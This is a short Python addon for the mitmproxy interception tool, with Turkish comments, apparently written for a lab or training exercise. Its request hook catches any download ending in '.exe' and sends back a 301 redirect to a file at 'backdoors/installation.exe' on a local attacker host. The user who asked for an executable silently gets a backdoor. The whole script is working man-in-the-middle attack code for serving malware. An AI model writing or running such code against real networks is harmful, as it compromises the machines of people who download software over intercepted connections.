import mitmproxy

def request(flow):
	if flow.request.host != "10.0.2.15" and flow.request.pretty_url.endswith(".exe"):
		flow.response = mitmproxy.http.HTTPResponse.make(301, "", {"Location" : "http://10.0.2.15/backdoors/installation.exe"})
		
		
		
		#1=HTTP STATUS CODE = 301
		#2=CONTENT (icerik)
		#3=HEADERS (yeni dosyanin konumunu)
		#print("burada bir exe dosyasi yakaladik")
		#print(flow.request.pretty_url)


#def response(flow):
#	print("burasi cevaplari veriyor")
#	print(flow)

